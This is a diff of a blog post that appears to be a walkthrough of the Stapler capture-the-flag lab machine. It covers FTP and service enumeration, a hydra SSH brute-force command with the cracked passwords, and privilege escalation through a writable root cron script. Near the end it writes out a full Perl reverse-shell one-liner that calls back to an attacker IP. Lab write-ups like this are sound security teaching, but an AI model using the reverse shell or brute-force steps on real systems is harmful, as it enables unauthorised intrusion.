@@ -37,20 +37,20 @@ Connecting to FTP we are presented a message:
 220-
 220
 ```
-![img of ftp output](/assets/images/stapler/image.png)
+![img of ftp output](/blog/assets/images/stapler/image.png)
 
 We are able to login anonymously and find that there is a file available for download.
 
-![img of ftp output](/assets/images/stapler/image2.png)
+![img of ftp output](/blog/assets/images/stapler/image2.png)
 
 Download the note and read it:
 Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
 
-![img of ftp output](/assets/images/stapler/image3.png)
+![img of ftp output](/blog/assets/images/stapler/image3.png)
 
 Using nmap to get the version of FTP: vsftpd 2.0.8 or later
 
-![img of ftp output](/assets/images/stapler/image13.png)
+![img of ftp output](/blog/assets/images/stapler/image13.png)
 
 **Port 22:**
 
@@ -144,15 +144,15 @@ S-1-22-1-1029 Unix User\elly (Local User)
 **Port 666:**
 Using netcat to connect to port 666 we see a bunch of gibberish.
 
-![image of gibberish](/assets/images/stapler/image4.png)
+![image of gibberish](/blog/assets/images/stapler/image4.png)
 
 If we capture this gibberish out to a file.
 
-![image of gibberish](/assets/images/stapler/image5.png)
+![image of gibberish](/blog/assets/images/stapler/image5.png)
 
 We see that it's a zip file.
 
-![img message2.jpg](/assets/images/stapler/image6.png)
+![img message2.jpg](/blog/assets/images/stapler/image6.png)
 
 This contains an interesting file message2.jpg.
 
@@ -162,29 +162,29 @@ I don't have a valid username or password for mysql, but I was able to find the 
 
 5.7.12-0ubuntu1
 
-![img mysql version](/assets/images/stapler/image7.png)
+![img mysql version](/blog/assets/images/stapler/image7.png)
 
 **Port 12380:**
 
 Using curl, I looked at http and https for this port to find that https was a bit more promising.
 
-![img curl 12380](/assets/images/stapler/image8.png)
+![img curl 12380](/blog/assets/images/stapler/image8.png)
 
-![img curl 12380 https](/assets/images/stapler/image9.png)
+![img curl 12380 https](/blog/assets/images/stapler/image9.png)
 
-![img browser 12380 https](/assets/images/stapler/image10.png)
+![img browser 12380 https](/blog/assets/images/stapler/image10.png)
 
 I ran gobuster to enumerate directories using a wordlist and found some interesting directories.
 
-![gobuster](/assets/images/stapler/image11.png)
+![gobuster](/blog/assets/images/stapler/image11.png)
 
 In announcements, there is a message that could lead to more information, but not super helpful to us right now.
 
-![announcements](/assets/images/stapler/image12.png)
+![announcements](/blog/assets/images/stapler/image12.png)
 
 phpmyadmin exposed is dangerous, however, since I still don't have credentials to login there, I will leave this for a bit later.
 
-![announcements](/assets/images/stapler/image20.png)
+![announcements](/blog/assets/images/stapler/image20.png)
 
 Looking at https://192.168.1.116:12380/phpmyadmin/doc/html/index.html I was able to determine the current version of phpmyadmin to be 4.5.4.1.
 
@@ -205,14 +205,14 @@ Connecting to the mount points didn't reveal anything interesting so I decided t
 
     hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh
 
-![Bruteforce](/assets/images/stapler/image14.png)
+![Bruteforce](/blog/assets/images/stapler/image14.png)
 
 Now I have 3 accounts that I can use to ssh to the box.
 - JBare: cookie
 - MFrei: letmein
 - Drew: qwerty
 
-![access through ssh](/assets/images/stapler/image15.png)
+![access through ssh](/blog/assets/images/stapler/image15.png)
 
 Using the password (cookie) from above I was able to ssh to the machine.
 
@@ -221,13 +221,13 @@ I then started with the enumeration steps on the box itself. https://blog.g0tmi1
 `ls -lart /etc/cron.d/*`
 
 logrotate looked interesting as it calls to a script using the root user.
-![logrotate](/assets/images/stapler/image16.png)
+![logrotate](/blog/assets/images/stapler/image16.png)
 
 `ls -l /usr/local/sbin/cron-logrotate.sh`
 
 `cat /usr/local/sbin/cron-logrotate.sh`
 
-![logrotate](/assets/images/stapler/image17.png)
+![logrotate](/blog/assets/images/stapler/image17.png)
 
 Seeing that I had permissions to write to a script that is run by the root user every 5 minutes got me super excited!
 
@@ -235,11 +235,11 @@ I added a reverse shell using perl to this script:
 
     perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
-![reverse shell in script](/assets/images/stapler/image18.png)
+![reverse shell in script](/blog/assets/images/stapler/image18.png)
 
 All that was left was to create a netcat listener on my attacking machine to listen for the reverse shell :-)
 
-![reverse shell connects](/assets/images/stapler/image19.png)
+![reverse shell connects](/blog/assets/images/stapler/image19.png)
 
 **BOOM!**
 
